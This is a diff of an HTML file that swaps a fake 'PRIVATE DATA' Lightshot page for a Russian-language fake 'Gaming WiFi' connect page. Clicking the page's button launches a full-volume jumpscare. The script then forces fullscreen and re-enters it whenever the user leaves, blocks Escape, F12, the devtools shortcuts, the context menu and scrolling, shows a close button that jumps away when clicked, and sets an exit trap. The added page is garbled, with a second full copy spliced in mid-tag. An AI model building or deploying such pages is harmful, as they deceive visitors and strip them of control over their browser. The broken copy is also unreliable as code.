@@ -1,220 +1,727 @@
-<!DOCTYPE html><html lang="en"><head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
-<title>PRIVATE DATA</title>
-<meta property="og:title" content="Screenshot">
-<meta property="og:site_name" content="Lightshot">
-<meta property="og:image" content="lightshot.png">
-<meta property="og:description" content="Captured with Lightshot">
-<meta property="og:type" content="website">
-<meta name="twitter:card" content="photo">
-<meta name="twitter:title" content="Screenshot">
-<meta name="twitter:site" content="@light_shot">
-<meta name="twitter:description" content="Captured with Lightshot">
-<meta name="twitter:image:src" content="lightshot.png">
-<link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
-<style type="text/css">
-            p {
-                margin: 0;
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaming WiFi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #0a0a0a;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Анимация падающих звезд */
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: fall linear infinite;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
             }
-
-            *, *::before, *::after {
-                box-sizing: border-box;
+        }
+        
+        .content {
+            position: relative;
+            z-index: 1;
+            max-width: 600px;
+        }
+        
+        .wifi-title {
+            font-size: 3.5rem;
+            margin-bottom: 30px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
             }
-
-            .overlay, .scare {
-                position: fixed;
-
-                top: 0;
-                left: 0;
-
-                height: 100vh;
-                width: 100vw;
+            to {
+                text-shadow: 0 0 30px rgba(0, 204, 255, 0.8), 0 0 40px rgba(0, 204, 255, 0.6);
             }
-
-            p.overlay-title {
-                font-size: 24px;
-                font-weight: 900;
-                color: black;
-                line-height: 1;
-
-                margin-bottom: 16px;
-            }
-
-            .overlay-button {
-                display: inline-flex;
-                align-items: center;
-
-                height: 40px;
-
-                padding-right: 24px;
-                padding-left: 24px;
-
-                font-size: 16px;
-                font-weight: 500;
-                line-height: 1;
-
-                border-radius: 4px;
-
-                margin: 4px;
-
-                cursor: pointer;
-            }
-
-            .overlay-buttons-wrapper {
-                margin: 24px -8px -8px;
-            }
-
-            #accept-button {
-                background-color: rgb(132, 94, 194);
-
-                color: white;
-            }
-
-            #decline-button {
-                color: rgb(132, 94, 194);
-
-                border: 2px solid rgb(132, 94, 194);
-            }
-
-            p.overlay-description {
-                font-size: 16px;
-                font-weight: 400;
-                color: rgba(0, 0, 0, 0.5);
-                line-height: 1.25;
-
-                margin-bottom: 16px;
-            }
-
-            a.overlay-link {
-                display: inline-block;
-
-                text-decoration: none;
-
-                font-size: 16px;
-                font-weight: 500;
-                color: rgb(132, 94, 194);
-                line-height: 1;
-
-                position: relative;
-
-                margin-top: 16px;
-            }
-
-            a.overlay-link::before {
-                position: absolute;
-
-                content: "";
-
-                height: calc(50% + 4px);
-                width: calc(100% + 8px);
-
-                bottom: -4px;
-                left: -4px;
-
-                background-color: rgba(132, 94, 194, 0.1);
-            }
-
-            .overlay-body {
-                max-width: 512px;
-
-                text-align: center;
-
-                font-family: "Inter", sans-serif;
-            }
-
-            .overlay[hidden] {
-                display: none;
-            }
-
-            .overlay {
-                z-index: 2;
-
-                display: flex;
-                align-items: center;
-                justify-content: center;
-
-                background-color: #f5f6fa;
-
-                padding-right: 24px;
-                padding-left: 24px;
-            }
-
-            .scare {
-                z-index: 1;
-            }
-
-            video#video {
-                height: 100%;
-                width: 100%;
-
-                object-fit: cover;
-            }
-
-            video#video::-webkit-media-controls-enclosure {
-                display:none !important;
-            }
-        </style>
+        }
+        
+        .connect-btn {
+            background: linear-gradient(45deg, #1a1a1a, #333333);
+            border: 2px solid #00ff88;
+            border-radius: 50px;
+            color: #00ff88;
+            font-size: 1.5rem;
+            font-weight: bold;
+            padding: 20px 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .connect-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            background: linear-gradient(45deg, #222222, #444444);
+        }
+        
+        .connect-btn:active {
+            transform: translateY(2px);
+        }
+        
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+        
+        .scrimer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.1s ease-out;
+        }
+        
+        .scrimer-content {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .scrimer img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .fake-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2rem;
+            cursor: not-allowed;
+            background: rgba(255, 0, 0, 0.3);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            animation: fakeClosePulse 1s infinite;
+        }
+        
+        @keyframes fakeClosePulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .warning-text {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #ff4444;
+            font-size: 1.2rem;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+            animation: warningBlink 2s infinite;
+        }
+        
+        @keyframes warningBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+    </style>
 </head>
 <body>
-<div id="overlay" class="overlay">
-<div class="overlay-body">
-<p class="overlay-title">Подключение к приватной базе данных.</p>
-<p class="overlay-description">Данный сайт использует файлы cookie</p>
-<div class="overlay-buttons-wrapper">
-<div id="accept-button" class="overlay-button">Принять</div>
-<div id="decline-button" class="overlay-button">Отклонить</div>
-</div>
-<a href="https://memeNFC.t.me/" target="_blank" class="overlay-link">Информация</a>
-</div>
-</div>
-<div class="scare">
-<video id="video" class="video" src="video.mp4" loop></video>
-</div>
-<script type="text/javascript">
-            const video = document.getElementById("video");
-            const overlay = document.getElementById("overlay");
-            const declineButton = document.getElementById("decline-button");
-            const acceptButton = document.getElementById("accept-button");
+    <div class="stars" id="stars"></div>
+    
+    <div class="content">
+        <div class="wifi-title">Gaming WiFi</div>
+        <button class="connect-btn" id="connectBtn">ПОДКЛЮЧИТЬСЯ К СЕТИ</button>
+    </div>
 
-            let hasClicked;
+    <div class="scrimer" id="scrimer">
+        <div class="scrimer-content">
+            <img src="https://i.makeagif.com/media/1-22-2016/7f3UOH.gif" alt="Scrimer">
+            <div class="fake-close" id="fakeClose">✕</div>
+            <div class="warning-text">ПОДКЛЮЧЕНИЕ НЕ МОЖЕТ БЫТЬ ПРЕРВАНО</div>
+        </div>
+    </div>
 
-            window.onbeforeunload = function( ) {
-                if(hasClicked) return true;
+    <audio id="scareSound" preload="auto" loop>
+        <source src="https://www.myinstants.com/media/sounds/jumpscare-sound.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Создание анимации звезд
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 100;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                
+                // Случайные параметры для звезды
+                const size = Math.random() * 3 + 1;
+                const left = Math.random() * 100;
+                const animationDuration = Math.random() * 10 + 5;
+                const animationDelay = Math.random() * 5;
+                
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.left = `${left}%`;
+                star.style.top = `${-size}px`;
+                star.style.animationDuration = `${animationDuration}s`;
+                star.style.animationDelay = `${animationDelay}s`;
+                star.style.opacity = Math.random() * 0.7 + 0.3;
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Инициализация звезд
+        createStars();
+        
+        const connectBtn = document.getElementById('connectBtn');
+        const scrimer = document.getElementById('scrimer');
+        const fakeClose = document.getElementById('fakeClose');
+        const scareSound = document.getElementById('scareSound');
+        
+        // Устанавливаем максимальную громкость
+        scareSound.volume = 1.0;
+        
+        connectBtn.addEventListener('click', function() {
+            scrimer.style.display = 'flex';
+            
+            // Воспроизводим звук с максимальной громкостью
+            scareSound.volume = 1.0;
+            scareSound.play().catch(e => {
+                console.log('Автовоспроизведение звука заблокировано');
+                // Пытаемся воспроизвести после взаимодействия
+                document.addEventListener('click', function playSound() {
+                    scareSound.play();
+                    document.removeEventListener('click', playSound);
+                });
+            });
+            
+            // Блокируем все способы закрытия страницы
+            window.onbeforeunload = function() {
+                return "Подключение к сети не может быть прервано!";
             };
-
-            function buttonClick(event) {
-                event.preventDefault();
-                if(!hasClicked) hasClicked = true;
-                overlay.hidden = true;
-                video.play();
-                videoClick();
+            
+            // Открываем страницу в полноэкранном режиме
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => {
+                    console.log('Полноэкранный режим не поддерживается');
+                });
             }
-
-            function videoClick(event) {
-                if(event) event.preventDefault();
-                // if not fullscreen
-                const { documentElement } = document;
-                if(documentElement.requestFullscreen) documentElement.requestFullscreen();
-                else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
-                else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
-                else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+            
+            // Блокируем контекстное меню
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Блокируем клавиши
+            document.addEventListener('keydown', function(e) {
+                // Блокируем F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Escape
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'u') ||
+                    e.key === 'Escape') {
+                    e.preventDefault();
+                    fakeClose.classList.add('shake');
+                    setTimeout(() => {
+                        fakeClose.classList.remove('shake');
+                    }, 500);
+                }
+            });
+            
+            // Блокируем попытки выйти из полноэкранного режима
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    }
+                }
+            });
+        });
+        
+        // Ложная кнопка закрытия - ничего не делает
+        fakeClose.addEventListener('click', function() {
+            this.classList.add('shake');
+            setTimeout(() => {
+                this.classList.remove('shake');
+            }, 500);
+            
+            // Перемещаем ложную кнопку в случайное место
+            const maxX = window.innerWidth - 60;
+            const maxY = window.innerHeight - 60;
+            const randomX = Math.floor(Math.random() * maxX);
+            const randomY = Math.floor(Math.random() * maxY);
+            
+            this.style.position = 'absolute';
+            this.style.left = randomX + 'px';
+            this.style.top = randomY + 'px';
+        });
+        
+        // Блокируем все клики по скримеру
+        scrimer.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            fakeClose.classList.add('shake');
+            setTimeout(() => {
+                fakeClose.classList.remove('shake');
+            }, 500);
+        });
+        
+        // Блокируем скролл
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+    </scri<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gaming WiFi</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: #0a0a0a;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        /* Анимация падающих звезд */
+        .stars {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: fall linear infinite;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+                opacity: 0;
             }
+        }
+        
+        .content {
+            position: relative;
+            z-index: 1;
+            max-width: 600px;
+        }
+        
+        .wifi-title {
+            font-size: 3.5rem;
+            margin-bottom: 30px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            background: linear-gradient(45deg, #00ff88, #00ccff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            animation: glow 2s ease-in-out infinite alternate;
+        }
+        
+        @keyframes glow {
+            from {
+                text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+            }
+            to {
+                text-shadow: 0 0 30px rgba(0, 204, 255, 0.8), 0 0 40px rgba(0, 204, 255, 0.6);
+            }
+        }
+        
+        .connect-btn {
+            background: linear-gradient(45deg, #1a1a1a, #333333);
+            border: 2px solid #00ff88;
+            border-radius: 50px;
+            color: #00ff88;
+            font-size: 1.5rem;
+            font-weight: bold;
+            padding: 20px 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+            position: relative;
+            overflow: hidden;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .connect-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            background: linear-gradient(45deg, #222222, #444444);
+        }
+        
+        .connect-btn:active {
+            transform: translateY(2px);
+        }
+        
+        .connect-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .connect-btn:hover::before {
+            left: 100%;
+        }
+        
+        .scrimer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            animation: fadeIn 0.1s ease-out;
+        }
+        
+        .scrimer-content {
+            position: relative;
+            width: 100%;
+            height: 100%;
+        }
+        
+        .scrimer img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        
+        .fake-close {
+            position: absolute;
+            top: 20px;
+            right: 30px;
+            color: white;
+            font-size: 2rem;
+            cursor: not-allowed;
+            background: rgba(255, 0, 0, 0.3);
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1001;
+            animation: fakeClosePulse 1s infinite;
+        }
+        
+        @keyframes fakeClosePulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        .warning-text {
+            position: absolute;
+            bottom: 20px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: #ff4444;
+            font-size: 1.2rem;
+            text-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
+            animation: warningBlink 2s infinite;
+        }
+        
+        @keyframes warningBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .shake {
+            animation: shake 0.5s;
+        }
+        
+        @keyframes shake {
+            0% { transform: translateX(0); }
+            25% { transform: translateX(-10px); }
+            50% { transform: translateX(10px); }
+            75% { transform: translateX(-10px); }
+            100% { transform: translateX(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="stars" id="stars"></div>
+    
+    <div class="content">
+        <div class="wifi-title">Gaming WiFi</div>
+        <button class="connect-btn" id="connectBtn">ПОДКЛЮЧИТЬСЯ К СЕТИ</button>
+    </div>
 
-            acceptButton.addEventListener("click", buttonClick);
-            declineButton.addEventListener("click", buttonClick);
-            video.addEventListener("click", videoClick);
-        </script>
+    <div class="scrimer" id="scrimer">
+        <div class="scrimer-content">
+            <img src="https://i.makeagif.com/media/1-22-2016/7f3UOH.gif" alt="Scrimer">
+            <div class="fake-close" id="fakeClose">✕</div>
+            <div class="warning-text">ПОДКЛЮЧЕНИЕ НЕ МОЖЕТ БЫТЬ ПРЕРВАНО</div>
+        </div>
+    </div>
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-07T0N39Y0D"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
+    <audio id="scareSound" preload="auto" loop>
+        <source src="https://www.myinstants.com/media/sounds/jumpscare-sound.mp3" type="audio/mpeg">
+    </audio>
 
-  gtag('config', 'G-07T0N39Y0D');
-</script>
-
-</body></html>
+    <script>
+        // Создание анимации звезд
+        function createStars() {
+            const starsContainer = document.getElementById('stars');
+            const starCount = 100;
+            
+            for (let i = 0; i < starCount; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                
+                // Случайные параметры для звезды
+                const size = Math.random() * 3 + 1;
+                const left = Math.random() * 100;
+                const animationDuration = Math.random() * 10 + 5;
+                const animationDelay = Math.random() * 5;
+                
+                star.style.width = `${size}px`;
+                star.style.height = `${size}px`;
+                star.style.left = `${left}%`;
+                star.style.top = `${-size}px`;
+                star.style.animationDuration = `${animationDuration}s`;
+                star.style.animationDelay = `${animationDelay}s`;
+                star.style.opacity = Math.random() * 0.7 + 0.3;
+                
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Инициализация звезд
+        createStars();
+        
+        const connectBtn = document.getElementById('connectBtn');
+        const scrimer = document.getElementById('scrimer');
+        const fakeClose = document.getElementById('fakeClose');
+        const scareSound = document.getElementById('scareSound');
+        
+        // Устанавливаем максимальную громкость
+        scareSound.volume = 1.0;
+        
+        connectBtn.addEventListener('click', function() {
+            scrimer.style.display = 'flex';
+            
+            // Воспроизводим звук с максимальной громкостью
+            scareSound.volume = 1.0;
+            scareSound.play().catch(e => {
+                console.log('Автовоспроизведение звука заблокировано');
+                // Пытаемся воспроизвести после взаимодействия
+                document.addEventListener('click', function playSound() {
+                    scareSound.play();
+                    document.removeEventListener('click', playSound);
+                });
+            });
+            
+            // Блокируем все способы закрытия страницы
+            window.onbeforeunload = function() {
+                return "Подключение к сети не может быть прервано!";
+            };
+            
+            // Открываем страницу в полноэкранном режиме
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().catch(e => {
+                    console.log('Полноэкранный режим не поддерживается');
+                });
+            }
+            
+            // Блокируем контекстное меню
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+            
+            // Блокируем клавиши
+            document.addEventListener('keydown', function(e) {
+                // Блокируем F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, Escape
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
+                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+                    (e.ctrlKey && e.key === 'u') ||
+                    e.key === 'Escape') {
+                    e.preventDefault();
+                    fakeClose.classList.add('shake');
+                    setTimeout(() => {
+                        fakeClose.classList.remove('shake');
+                    }, 500);
+                }
+            });
+            
+            // Блокируем попытки выйти из полноэкранного режима
+            document.addEventListener('fullscreenchange', function() {
+                if (!document.fullscreenElement) {
+                    if (document.documentElement.requestFullscreen) {
+                        document.documentElement.requestFullscreen();
+                    }
+                }
+            });
+        });
+        
+        // Ложная кнопка закрытия - ничего не делает
+        fakeClose.addEventListener('click', function() {
+            this.classList.add('shake');
+            setTimeout(() => {
+                this.classList.remove('shake');
+            }, 500);
+            
+            // Перемещаем ложную кнопку в случайное место
+            const maxX = window.innerWidth - 60;
+            const maxY = window.innerHeight - 60;
+            const randomX = Math.floor(Math.random() * maxX);
+            const randomY = Math.floor(Math.random() * maxY);
+            
+            this.style.position = 'absolute';
+            this.style.left = randomX + 'px';
+            this.style.top = randomY + 'px';
+        });
+        
+        // Блокируем все клики по скримеру
+        scrimer.addEventListener('click', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            fakeClose.classList.add('shake');
+            setTimeout(() => {
+                fakeClose.classList.remove('shake');
+            }, 500);
+        });
+        
+        // Блокируем скролл
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+        
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+    </script>
+</body>
+</html>pt>
+</body>
+</html> 
